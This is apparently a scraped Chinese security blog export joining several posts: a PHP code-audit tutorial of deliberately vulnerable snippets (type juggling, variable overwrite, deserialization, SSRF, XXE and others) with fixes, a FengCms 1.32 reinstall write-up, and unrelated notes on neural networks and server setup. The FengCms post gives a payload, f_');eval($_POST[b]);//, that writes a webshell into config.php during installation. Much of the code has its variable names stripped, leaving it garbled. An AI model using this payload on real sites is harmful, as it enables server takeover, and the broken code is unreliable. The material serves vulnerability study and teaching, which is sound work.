array_search绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpif (!is_array($_GET[&apos;test&apos;])) &#123; exit;&#125;test = _GET[&apos;test&apos;];for (i = 0; i &lt; count(test); i++) &#123; if (test[i] === &quot;admin&quot;) &#123; echo &quot;error&quot;; exit; &#125; test[i] = intval(test[i]);&#125;if (array_search(&quot;admin&quot;, $test) === 0) &#123; echo &quot;flag&quot;;&#125; else &#123; echo &quot;false&quot;;&#125;? &gt; 传入数组test[]=0可以绕过修复建议：将array_search第三个参数为true则就不能绕过建议修复代码：if (array_search(“admin”, $test, true) === 0) { 6.4 strcmp绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021&lt; ?php$password = &quot;*******&quot;;if (isset($_POST[&apos;password&apos;])) &#123; if (strcmp(_POST[&apos;password&apos;], password) == 0) &#123; echo &quot;Right!!!login success&quot;; exit; &#125; else &#123; echo &quot;Wrong password..&quot;; &#125;&#125;? &gt; 在PHP&lt;5.3的情况下，password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等修复建议： 不建议使用该函数 7.1变量覆盖漏洞0x01漏洞背景变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617&lt; ?php$auth = &apos;0&apos;;extract($_GET);if ($auth == 1) &#123; echo &quot;private!&quot;;&#125; else &#123; echo &quot;public!&quot;;&#125;? &gt; 将可控的数组变量解析，导致变量覆盖漏洞修复建议：不要将用户可控的数据进行变量解析漏洞代码2： 123456789&lt;?php$var='init';parse_str($_SERVER['QUERY_STRING']);print $var;?&gt; parse_str将字符串解析成多个变量，导致变量覆盖漏洞修复建议：不要将用户可控的数据进行变量解析漏洞代码3： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$magic_quotes_gpc = ini_get('magic_quotes_gpc');function _FilterAll(fk, &amp;svar)&#123;global cfg_notallowstr, cfg_replacestr;if (is_array($svar)) &#123;foreach (svar as k =&gt; $v) &#123;svar[k] = _FilterAll(fk, v);&#125;&#125; else &#123;if (cfg_notallowstr != '' &amp;&amp; preg_match(\"#\" . cfg_notallowstr . \"#i\", $svar)) &#123;ShowMsg(\" &#123;$fk&#125; has not allow words!\", '-1');exit;&#125;if ($cfg_replacestr != '') &#123;svar = preg_replace('/' . cfg_replacestr . '/i', \"***\", $svar);&#125;&#125;if (!$magic_quotes_gpc) &#123;svar = addslashes(svar);&#125;return $svar;&#125;?&gt; 该片段取自于dedecms变量覆盖漏洞 7.2 IP伪造漏洞0x01漏洞背景header里CLIENT-IP与X-FORWARDED-FOR都是可以用随意伪造的，当这些值未经处理直接用，会导致XSS、SQL注入等漏洞 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt; ?phpfunction getIP() &#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif(getenv('HTTP_X_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif(getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif(getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif(getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; ip = _SERVER['REMOTE_ADDR']; &#125; return $ip;&#125;echo getIP();? &gt; 修复建议：对传入内容进行addslashes和htmlspecialchars过滤建议修复代码：return addslashes($ip); 7.3编码绕过0x01漏洞背景一般程序带有全局addslashes过滤，但是后面又对传入内容进行解码，解码之后内容没有进行过滤 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223&lt; ?php$mysqli = new mysqli('localhost', 'root', 'root', 'code'); //数据库连接if (!empty($_POST['username']))&#123; username = base64_decode(addslashes(_POST['username'])); data = mysqli - &gt;query(\"select * from user where username='$username'\"); if ($data - &gt;num_rows !== '0') &#123; arr = data - &gt;fetch_row(); //.... &#125;&#125;? &gt; 虽然对POST传入内容过滤，可经过二次编码绕过过滤修复建议：在解码之后再进行一次字符串过滤建议修复代码： 1username = addslashes(base64_decode(addslashes(_POST['username']))); 7.4反序列化漏洞0x01漏洞背景php反序列化漏洞又称对象注入，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpclass test&#123; public $username = ''; public $password = ''; public $file = ''; public function out() &#123; echo \"username: \".this - &gt;username.\"&lt;br&gt;\".\"password: \".this - &gt;password; &#125; public function __toString() &#123; return file_get_contents($this - &gt;file); &#125;&#125;unserialize($_POST['str']);? &gt; test类的魔术方法中存在可以利用的地方，通过反序列化漏洞可以控制变量，达到写入文件的效果修复建议：如果代码中有反序列化，不要在类的魔术方法中进行敏感操作 7.5截断漏洞0x01漏洞背景PHP&lt;5.3.4中，%00可截断字符串，在写入文件时截断路径导致任意文件名写入 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617&lt; ?phpif (isset($_GET['password'])) &#123; if (ereg(\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else &#123; echo 'success'; &#125;&#125;? &gt; 这里限制了前缀跟后缀，但是没有过滤../跟%00截断漏洞，导致可以任意文件读取修复建议：不允许..等跨目录字符出现，使用addslashes过滤%00防止被截断包含建议修复代码： 12345678910111213141516171819&lt; ?phpid = addslashes(_GET['id']);if (strstr($id, '..'))&#123; echo '输入不合法'; exit;&#125;file = file_get_contents('upload/'.id.'.txt');echo $file;? &gt; 漏洞代码2： 1234567891011121314151617&lt; ?phpif (isset($_GET['password'])) &#123; if (ereg(\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else &#123; echo 'success'; &#125;&#125;? &gt; ereg函数存在NULL截断漏洞修复建议：停止使用ereg与eregi函数建议修复代码： 1if (preg_replace(\"/[a-zA-Z0-9]+/\", $_GET['password']) === FALSE) &#123; 7.6 hash长度扩展攻击漏洞0x01漏洞背景哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122&lt; ?php$secret = \"XXXXXXXXXXXXXXX\";// This secret is 15 characters long for security!$username = \"admin\";password = _POST[\"password\"];if (COOKIE[\"getmein\"] === md5(secret.urldecode(username.password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die(\"The flag is \".$flag);&#125; else &#123; die(\"Your cookies don't match up! STOP HACKING THIS SITE.\");&#125;? &gt; 漏洞产生条件是当可控内容拼接在$secret后面，再进行md5加密；且要知道同样是经过$secret加密后的32位md5 修复建议： 将$secret放到后面建议修复代码： 1if (COOKIE[\"getmein\"] === md5(urldecode(username . password). secret)) &#123; 7.7 CSRF跨站请求伪造漏洞0x01漏洞背景​ 在跨站请求伪造（CSRF）攻击里面，攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。而浏览器的安全策略是允许当前页面发送到任何地址的请求，因此也就意味着当用户在浏览他/她无法控制的资源时，攻击者可以控制页面的内容来控制浏览器发送它精心构造的请求。 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920&lt; ?phpinclude 'user.php'; //验证用户登录if ($_GET['act'] == 'newpwd')&#123; newpwd = md5(_POST['newpwd']); sql = \"update user set password='newpwd' where id=$userid\"; mysql_query($sql); mysql_close($conn); echo '修改密码成功';&#125;? &gt; 未对CSRF进行任何防御，可以恶意构造表单，用户触发后可以修改其密码修复建议：验证HTTP Referer字段、在请求地址中添加 token并验证、用XMLHttpRequest附加在header里 7.8 SSRF请求伪造漏洞0x01漏洞背景SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从 外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 0x02漏洞代码及分析漏洞代码1： 12345678910111213&lt; ?php$ch = curl_init();curl_setopt(ch, CURLOPT_URL, _GET['url']);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);? &gt; 未限制URL的协议，恶意使用其他协议可导致源码泄露、内网泄露等漏洞；如果使用了CDN，请求http会泄露源站IP修复建议：限制协议为HTTP、HTTPS；禁止30x跳转建议修复代码： 12345678910111213141516171819202122232425&lt; ?phpurl = _GET['url'];if (strpos(url, 'http://') === false &amp;&amp; strpos(url, 'https://') === false)&#123; exit('请求链接不合法');&#125;$ch = curl_init();curl_setopt(ch, CURLOPT_URL, url);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);? &gt; 7.9伪随机数漏洞0x01漏洞背景mt_rand()并不是一个真·随机数生成函数,实际上绝大多数编程语言中的随机数函数生成的都都是伪随机数。伪随机是由可确定的函数（常用线性同余），通过一个种子（常用时钟），产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpfunction wp_generate_password(length = 12, special_chars = true)&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special_chars) &#123; chars. = '!@#%^&amp;*()'; &#125; $password = ''; for (i = 0; i &lt; length; i++) &#123; password. = substr(chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125;$key = wp_generate_password(16, false);echo \"[*] This is a key for public:\".$key.\"\\n\";$private = wp_generate_password(10, false);echo \"[*] Create a private key which you don't know:\".$private.\"\\n\";? &gt; 如果没有mt_srand()给随机数发生器播种，mt_rand会使用一个随机生成的固定种子，如果知道$key的情况下，可以预测出$private。修复建议：mt_rand之前进行随机播种。mt_srand((double)microtime()*1000000);建议修复代码： 12345678910111213141516171819202122232425function wp_generate_password(length = 12, special_chars = true)&#123; mt_srand((double) microtime() * 1000000); $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special_chars) &#123; chars. = '!@#%^&amp;*()'; &#125; $password = ''; for (i = 0; i &lt; length; i++) &#123; password. = substr(chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125; 7.10 XXE漏洞0x01漏洞背景XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题. 0x02漏洞代码及分析漏洞代码1： 123456789&lt; ?php$xml = @file_get_contents('php://input');data = simplexml_load_string(xml);print_r($data);? &gt; simplexml_load_string函数读取XML会引起XXE漏洞，导致任意文件读取、命令执行漏洞修复建议：使用XMLReader或DOM方式解析XML建议修复代码： 123456789&lt; ?php$xml = @file_get_contents('php://input');data = XMLReader: :xml(xml, 'UTF-8', LIBXML_NONET);print_r($data);? &gt;","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://shackles.top/tags/代码审计/"}]},{"title":"FengCms1.32 重装漏洞","slug":"FengCms1.32 重装漏洞","date":"2017-10-19T15:53:56.000Z","updated":"2018-04-01T15:44:32.923Z","comments":true,"path":"2017/10/19/FengCms1.32 重装漏洞/","link":"","permalink":"https://shackles.top/2017/10/19/FengCms1.32 重装漏洞/","excerpt":"","text":"FengCms1.32 重装漏洞FengCms基于PHP+MYSQL开发。是一款 开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。 漏洞简介及危害 本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。 影响版本 FengCms1.32 实验步骤步骤1：了解漏洞原理本次漏洞的代码漏洞入口在install/index.php中，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123header(\"Content-type:text/html;charset=utf-8\");define(\"TPL_INCLUDE\",1);// 定义当前路径define('ABS_PATH',dirname(__FILE__));define('ROOT_PATH',dirname(ABS_PATH));if(!['step'])['step']=1;=ROOT_PATH.'/config.php';=ABS_PATH.'/install.sql';if(file_exists(ROOT_PATH.'/upload/INSTALL'))&#123; echo '[removed]alert(\"系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！\");[removed]'; echo '&lt;meta http-equiv=\"refresh\" content=\"0;url=/\"&gt;';&#125;switch(['step'])&#123; case '1': //安装许可协议 include ABS_PATH.\"/step/step1.php\"; break; case '2': //检查安装环境是否满足要求 = ''; if(extension_loaded('gd')) &#123; if(function_exists('imagepng')) .= 'png'; if(function_exists('imagejpeg')) .= ' jpg'; if(function_exists('imagegif')) .= ' gif'; &#125; = '0'; if(extension_loaded('json')) &#123; if(function_exists('json_decode') &amp;&amp; function_exists('json_encode')) = '1'; &#125; //新加fsockopen 函数判断,此函数影响安装后会员注册及登录操作。 if(function_exists('fsockopen')) &#123; = '1'; &#125; = preg_match(\"/^[0-9.]&#123;7,15&#125;$/\", @gethostbyname('www.baidu.cn')) ? 1 : 0; //是否满足FengCms安装需求 = (phpversion() &gt;= '5.2.0' &amp;&amp; extension_loaded('mysql') &amp;&amp; &amp;&amp; &amp;&amp; ) ? 1 : 0; //配置文件是否存在和可写 = (is_readable() &amp;&amp; is_writable()) ? 1 : 0; //上传目录是否可写 = (dir_writeable(ROOT_PATH.\"/upload\")) ? 1 : 0; //模块导出目录是否可写 = (dir_writeable(ROOT_PATH.\"/upload/module\")) ? 1 : 0; //前台缓存目录是否可写 = (dir_writeable(ROOT_PATH.\"/app/cache\")) ? 1 : 0; include ABS_PATH.\"/step/step2.php\"; break; case '3': //填写数据库信息 include ABS_PATH.\"/step/step3.php\"; break; case '4': //正在安装 =@mysql_connect(['host'],['user'],['password']); if(!)&#123; echo '[removed]alert(\"链接主机失败，请检查主机地址、用户名和密码是否正确！\");history.go(-1);[removed]'; exit(); &#125;elseif(intval(mysql_get_server_info())&lt;5)&#123; echo '[removed]alert(\"您的MYSQL版本为'. mysql_get_server_info().'，版本太低，不能安装FengCms!\");history.go(-1);[removed]'; exit(); &#125;else&#123; if(!mysql_select_db(['dbname'],))&#123; //如果数据库不存在，我们就进行创建。 if (!mysql_query(\"CREATE DATABASE \". ['dbname'] .\" default character set utf8;\",)) &#123; echo '[removed]alert(\"数据库不存在，创建不成功\");history.go(-1);[removed]'; &#125;else&#123; if(!mysql_select_db(['dbname'],))&#123; echo '[removed]alert(\"链接数据库失败，请检查数据库是否正确！\");history.go(-1);[removed]'; &#125;else&#123; include \"data.php\"; &#125; &#125; &#125;else&#123; include \"data.php\"; &#125; &#125; break; case '5': //安装完成 include ABS_PATH.\"/step/step5.php\"; = fopen(ROOT_PATH.'/upload/INSTALL','w'); fclose (); break; 上述代码代码首先判断upload/INSTALL文件是否存在，若存在，就弹出JavaScript代码，提示我们需要删除目录下的INSTALL文件，如图： 但在这里我们直接点击确定即可，可以无视它的提示，即是不删除INSTALL文件，也可以进行安装操作。 我们再来看看Install/install.php文件，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php &#125;// = fopen(, \"w\"); //以写入的方式打开config.php这个文件。if(['install'])&#123; //获取用户提交的数据。 =['host']; =['user']; =['password']; =['dbname']; if(!=@mysql_connect(,,))&#123; echo \"连接数据库失败！请返回上一页检查连接参数 返回修改\"; exit(); &#125;else&#123; mysql_query(\"set names gb2312\"); //设置数据库的编码，注意要与前面一致。 if(!mysql_select_db(,))&#123; //如果数据库不存在，我们就进行创建。 if(!mysql_query())&#123; echo \"创建数据库失败，请确认是否有足够的权限！返回修改\"; exit(); &#125; &#125;echo file_get_contents(); exit; = fopen(, \"w\"); //以写入的方式打开config.php这个文件。 fwrite(,); //将配置信息写入config.php文件。 fclose(); include_once(ABS_PATH.\"config.php\"); //导入配置信息. //下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。 //新建一个表test1 [] = \"CREATE TABLE `test1` ( `id` int(4) NOT NULL auto_increment, `name` varchar(20) character set gb2312 NOT NULL, `major` varchar(40) character set gb2312 NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;\"; //新建一个表test2 [] = \"CREATE TABLE `test2` ( `id` int(4) NOT NULL auto_increment, `name` varchar(20) character set gb2312 NOT NULL, `major` varchar(40) character set gb2312 NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;\"; //为test1表默认初始化一些数据。 []=\"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')\"; foreach( as )&#123; if(!mysql_query())&#123; //依次执行以上的sql语句，就是创建表和初始化数据。 echo \"创建表失败或者初始化数据失败\"; exit(); &#125; &#125; mysql_close(); echo \"安装成功\";//可以做一个跳转到首页。 exit(); &#125; 这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件： 我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码： 1f_&apos;);eval($_POST[b]);// 这样我们就可以通过参数a ，去执行任意的代码。 步骤2：验证漏洞注：如果点击确定后页面立即跳到首页，这时因为服务器配置高响应过快，在真实的场景中相应速度会很慢，足够我们输入相关的内容，这里将upload下INSTALL文件删除即可 1127.0.0.1/install/index.php 上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定： 1f_&apos;);eval($_POST[b]);// 当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。 接下来访问127.0.0.1 ，使用Post方式提交数据a=phpinfo(); 。。。 成功利用了FengCms重装漏洞。 修复建议 升级最新版本 在Post写入时，严格增加过滤 验证INSTALL文件是否存在，如果存在则跳出安装流程 参考：FengCms1.32系统重装漏洞导致getshell - 知道创宇 Seebug 漏洞平台https://www.seebug.org/vuldb/ssvid-93224","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Covolutions Neural Netwrk","slug":"Covolutions Neural Netwrk","date":"2017-10-08T15:53:56.000Z","updated":"2018-04-01T02:19:02.768Z","comments":true,"path":"2017/10/08/Covolutions Neural Netwrk/","link":"","permalink":"https://shackles.top/2017/10/08/Covolutions Neural Netwrk/","excerpt":"","text":"Covolutions Neural Netwrk​ 卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 [INPUT - CONV - RELU - POOL - FC] 也就是 [输入-卷积-激活-池化-分类得分 卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN） 由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。 DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络） 123数据-》自学习-》结果输入-》 算法 -》输出 空间共享 ​ 计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。 ​ 什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。 ​ 比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。 从LeNet到AlexNet 物体检测问题 Region CNN YOLO FACEBOOK提出来的YOLO网络，物体检测， 权重 W 与偏移量B 相同 不同的是输入的值 ConvNet体系结构：卷积层，池层和完全连接层（正如在常规神经网络中所见） ConvNetC++中卷积神经网络的GPU实现 一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整的基于Web的演示文稿显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。 双曲正切函数是双曲函数中的一个函数。 输入图像I。为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1] 2、 如果使用tanh激活函数，则归一化到[-1, 1]。 多个卷积（C）-下采样（S）层。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。 光栅化（X）。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。 传统的多层感知器（N&amp;O）。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。 输入层-隐层：是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 sigmoid 或 tanh ，那么这个隐层节点的输出应该是 1fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj) 也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即 1f(x)=act(Θx+b)f(x)=act(Θx+b) 若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。 隐层-输出层:可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。 卷积、下采样、光栅化、多层感知器预测 卷积离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为 从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的加权叠加。 下采样下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有： 最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。 均值池化（Mean Pooling）。取4个点的均值。 高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。 可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。 光栅化图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"服务器配置","slug":"服务器配置","date":"2017-10-05T15:53:56.000Z","updated":"2018-04-01T00:47:43.239Z","comments":true,"path":"2017/10/05/服务器配置/","link":"","permalink":"https://shackles.top/2017/10/05/服务器配置/","excerpt":"","text":"服务器配置CentOS教程 / 软件使用配置 http://www.centoscn.com/image-text/config/ CentOS 修改主机名 - Virson Ma - 博客园 http://www.cnblogs.com/mawanglin2008/p/3530790.html 区别 chown和chmod的用法 - 博客频道 - CSDN.NET http://blog.csdn.net/doupei2006/article/details/8015986 chown用法 用来更改某个目录或文件的用户名和用户组的 chown 用户名:组名文件路径（可以是就对路径也可以是相对路径） 例1：chown root:root /tmp/tmp1 就是把tmp下的tmp1的用户名和用户组改成root和root（只修改了tmp1的属组）. 例2：chown -R root:root /tmp/tmp1 就是把tmp下的tmp1下的所有文件的属组都改成root和root。 chmod用法 用来修改某个目录或文件的访问权限。 语法：chmod [who] [+ | - | =] [mode] 文件名 命令中各选项的含义为： 操作对象who可是下述字母中的任一个或者它们的组合： u 表示“用户（user）”，即文件或目录的所有者。 g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。 o 表示“其他（others）用户”。 a 表示“所有（all）用户”。它是系统默认值。 Hadoop2.7.3完全分布式集群搭建和测试 - 如果一切重来 - 博客频道 - CSDN.NET http://blog.csdn.net/xiaoxiangzi222/article/details/52757168 细细品味Hadoop - 随笔分类 - 虾皮 -博客园 http://www.cnblogs.com/xia520pi/category/346943.html 低版本物理机部署高版本OVF 报“硬件系列vmx12不受支持“解决办法 - 搬砖笔记 - 博客频道 - CSDN.NET http://blog.csdn.net/xfks55/article/details/52858622 vim /etc/sysconfig/network-scripts/ifcgf-eth0 静态地址 scp -r /usr/hadooproot@node1:/usr/hadoop Usage: hdfs [–config confdir] [–loglevel loglevel] COMMAND ​ where COMMAND is oneof: dfs run a filesystem command onthe file systems supported in Hadoop. classpath prints the classpath namenode -format format the DFS filesystem secondarynamenode run the DFS secondary namenode namenode run the DFS namenode journalnode run the DFS journalnode zkfc run the ZK Failover Controllerdaemon datanode run a DFS datanode dfsadmin run a DFS admin client haadmin run a DFS HA admin client fsck run a DFS filesystem checkingutility balancer run a cluster balancing utility jmxget get JMX exported values fromNameNode or DataNode. mover run a utility to move block replicasacross ​ storagetypes oiv apply the offline fsimageviewer to an fsimage oiv_legacy apply the offline fsimage viewer toan legacy fsimage oev apply the offline editsviewer to an edits file fetchdt fetch a delegation token from theNameNode getconf get config values fromconfiguration groups get the groups which usersbelong to snapshotDiff diff two snapshots of a directory ordiff the ​ currentdirectory contents with a snapshot lsSnapshottableDir list all snapshottable dirs owned by thecurrent user ​ Use -help to see options portmap run a portmap service nfs3 run an NFS version 3 gateway cacheadmin configure the HDFS cache crypto configure HDFS encryption zones storagepolicies list/get/set block storage policies version print the version 1、关闭firewall： systemctl stopfirewalld.service #停止firewall systemctl disablefirewalld.service #禁止firewall开机启动 firewall-cmd –state #查看默认防火墙状态（关闭后显示notrunning，开启后显示running） 关闭selinux 2）禁用selinux ​ 编辑 “/etc/selinux/config“文件，设置”SELINUX=disabled“ nano slave bin/hdfs namenode -**format sbin/start-all.sh** hdfs dfsadmin -report yum installjava-1.7.0-openjdk-devel.x86_64 安装jps Hadoop 启动节点Datanode失败解决_服务器应用_Linux公社-Linux系统门户网站 http://www.linuxidc.com/Linux/2014-11/108822.htm 先格式化再启动 出现该问题的原因：在第一次格式化dfs后，启动并使用了hadoop，后来又重新执行了格式化命令（hdfs namenode -format)，这时namenode的clusterID会重新生成，而datanode的clusterID 保持不变。 删除初始文件 hadoop集群只有一个datanode启动问题 - yijichangkong的专栏 - 博客频道 - CSDN.NET http://blog.csdn.net/yijichangkong/article/details/45438931 onlyoffice/documentserver - Docker Hub https://hub.docker.com/r/onlyoffice/documentserver/ 快速入门指南 http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/ 最重要的 - 开源的，首选的Slack-alternative https://bitnami.com/ https://www.nagios.org/ http://wiki.pentaho.com/display/COM/Community+Wiki+Home https://bitnami.com/stacks/project-management","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://shackles.top/tags/运维/"}]},{"title":"人工神经网络","slug":"人工神经网络","date":"2017-10-05T15:53:56.000Z","updated":"2018-04-01T02:20:56.438Z","comments":true,"path":"2017/10/05/人工神经网络/","link":"","permalink":"https://shackles.top/2017/10/05/人工神经网络/","excerpt":"","text":"人工神经网络人工神经网络最重要的是 : 分类 神经网络分类： ANN（人工神经网络） LSTM （循环神经网络） 时间共享 CNN（卷积神经网络）空间共享 基本流程： 1分类样本--》训练样本--》建模--》测试样本--》结果 参考：https://www.zhihu.com/question/22553761 空间切一刀 + 某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）), 但是可以一层一层级联​ 这一层是下一层的输入。 ​ 类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。 ​ 在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。 1234567其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。 反向传播算法 ： 结果反向决定输入，不断调整权值， 常用激活 函数 ： logistic Sigmoid sign , tanh 感知机： 其中激活函数 act 可以使用{sign, sigmoid, tanh}之一。 l 激活函数使用符号函数 sign 